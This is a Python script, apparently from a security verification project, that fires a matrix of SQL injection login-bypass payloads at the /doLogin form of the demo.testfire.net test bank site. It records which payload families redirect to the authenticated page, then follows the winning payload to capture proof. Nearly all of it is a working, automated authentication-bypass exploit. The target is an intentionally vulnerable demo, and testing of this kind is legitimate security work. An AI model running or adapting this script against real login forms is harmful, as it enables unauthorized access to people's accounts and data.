#!/usr/bin/env python3
"""IV-13 Phase 1: demo.testfire.net /doLogin — SQLi payload-family CALIBRATION.
Independent of SENTINEL codebase. stdlib only.
Supervisor question: EXACTLY which format bypasses into /bank/main.jsp?
Families tested: string-quote (no comment) / string-quote+comment /
numeric+comment / numeric (no comment) / user-comment / both-fields.
Note (from prior session record): target has shown time-window FLAPPING —
timestamps recorded per probe so the window is documented."""
import ssl, json, os, time, re, urllib.request, urllib.parse, urllib.error, http.cookiejar
from datetime import datetime, timezone, timedelta

BASE = 'http://demo.testfire.net'  # HTTPS cert EXPIRED 2026-10-03 (documented) — HTTP per prior campaign transport
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTX = ssl.create_default_context()
OUT = '/home/z/my-project/scripts/iv_out'
os.makedirs(OUT, exist_ok=True)
TZ = timezone(timedelta(hours=3))  # Africa/Tripoli EET+? (Libya = UTC+2 actually, no DST) -> use UTC+2
TZ = timezone(timedelta(hours=2))

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def make_opener(follow=True):
    cj = http.cookiejar.CookieJar()
    handlers = [urllib.request.HTTPCookieProcessor(cj),
                urllib.request.HTTPSHandler(context=CTX)]
    if not follow:
        handlers.append(NoRedirect())
    return urllib.request.build_opener(*handlers), cj

def post_dologin(uid, passw, follow=False, tries=2):
    data = urllib.parse.urlencode({'uid': uid, 'passw': passw}).encode()
    last = None
    for _ in range(tries):
        op, cj = make_opener(follow)
        req = urllib.request.Request(BASE + '/doLogin', data=data, method='POST', headers={
            'User-Agent': UA,
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': BASE + '/login.jsp',
            'Origin': BASE,
        })
        try:
            r = op.open(req, timeout=35)
            body = r.read().decode('utf-8', 'replace')
            return {'status': r.status, 'location': r.headers.get('Location'),
                    'final_url': r.geturl(), 'len': len(body),
                    'cookies': [c.name for c in cj], 'body_head': body[:2500]}
        except urllib.error.HTTPError as e:
            body = e.read().decode('utf-8', 'replace')
            return {'status': e.code, 'location': e.headers.get('Location'),
                    'final_url': None, 'len': len(body),
                    'cookies': [c.name for c in cj], 'body_head': body[:2500]}
        except Exception as e:
            last = {'status': None, 'location': None, 'final_url': None, 'len': 0,
                    'cookies': [], 'body_head': '', 'error': repr(e)[:120]}
            time.sleep(2)
    return last

def classify(res):
    loc = res.get('location') or res.get('final_url') or ''
    if 'main.jsp' in loc:
        return 'BYPASS->main.jsp'
    if res['status'] == 302:
        return 'rejected(302->%s)' % (loc or '?')
    if res['status'] is None:
        return 'NET-ERROR ' + (res.get('error') or '')[:50]
    return 'rejected(HTTP %s len %d)' % (res['status'], res['len'])

MATRIX = [
    ('control-benign',     'ivinvalid7x9', 'wrongpass'),
    ('control-quotebreak', "'",            'x'),
    ('S1 str-quote',       "' OR '1'='1",  'x'),
    ('S2 str-quote-closed', "' OR '1'='1'", 'x'),
    ('S3 str-quote-empty', "' or ''='",    'x'),
    ('S4 str-quote-abc',   "' OR 'abc'='abc'", 'x'),
    ('S5 str+comment--',   "' OR '1'='1'-- ", 'x'),
    ('S6 str+comment#',    "' OR '1'='1'#",   'x'),
    ('N1 num+comment--',   "' OR 1=1--",   'x'),
    ('N1b num+comment--(emptypass)', "' OR 1=1--", ''),
    ('N1c num+comment w/prefix uid=1', "1' OR 1=1--", 'x'),
    ('N2 num+hash#',       "' OR 1=1#",    'x'),
    ('N3 num-noComment',   "' OR 1=1",     'x'),
    ('N4 num-lt-comment',  "' OR 2>1--",   'x'),
    ('N5 num-false-control', "' OR 1=2--", 'x'),
    ('P1 user+comment',    "admin'--",     'x'),
    ('P2 user+hash',       "admin'#",      'x'),
    ('B1 both-fields',     "' OR 1=1--",   "' OR 1=1--"),
]

def main():
    print('start', datetime.now(TZ).isoformat(), flush=True)
    results = []
    for fam, uid, passw in MATRIX:
        t0 = datetime.now(TZ).isoformat(timespec='seconds')
        res = post_dologin(uid, passw)
        v = classify(res)
        results.append({'family': fam, 'uid': uid, 'passw': passw, 'ts': t0,
                        'verdict': v, 'status': res['status'],
                        'location': res.get('location'), 'len': res.get('len'),
                        'final_url': res.get('final_url')})
        print('%-34s uid=%-22r %-5s %-30s %s' % (fam, uid, res['status'], v,
              res.get('location') or (res.get('error') or '')[:40]), flush=True)
        time.sleep(0.8)

    # Winner deep-proof: canonical numeric-comment payload, follow redirect chain
    res = post_dologin("1' OR 1=1--", 'x', follow=True)
    m = re.search(r'<title[^>]*>(.*?)</title>', res.get('body_head', ''), re.S | re.I)
    title = m.group(1).strip() if m else None
    err = re.search(r'(error|invalid|failed)[^<]{0,80}', (res.get('body_head') or ''), re.I)
    proof = {'payload': "uid=1' OR 1=1--&passw=x", 'ts': datetime.now(TZ).isoformat(timespec='seconds'),
             'status': res['status'], 'final_url': res.get('final_url'),
             'len': res.get('len'), 'title': title,
             'error_text': err.group(0)[:100] if err else None,
             'cookies': res.get('cookies')}
    print('\nWINNER-PROOF:', json.dumps(proof, ensure_ascii=False), flush=True)

    # And the string-quote family for contrast, followed
    res2 = post_dologin("' OR '1'='1", 'x', follow=True)
    m2 = re.search(r'<title[^>]*>(.*?)</title>', res2.get('body_head', ''), re.S | re.I)
    print('CONTRAST-S1: status=%s final=%s title=%r len=%s' % (
        res2['status'], res2.get('final_url'), m2.group(1).strip() if m2 else None, res2.get('len')), flush=True)

    json.dump({'started': None, 'matrix': results, 'winner_proof': proof,
               'contrast_S1': {'status': res2['status'], 'final_url': res2.get('final_url'), 'len': res2.get('len')}},
              open(os.path.join(OUT, 'testfire_dologin.json'), 'w'), indent=1, ensure_ascii=False)
    print('saved -> scripts/iv_out/testfire_dologin.json', flush=True)
    print('end', datetime.now(TZ).isoformat(), flush=True)

if __name__ == '__main__':
    main()
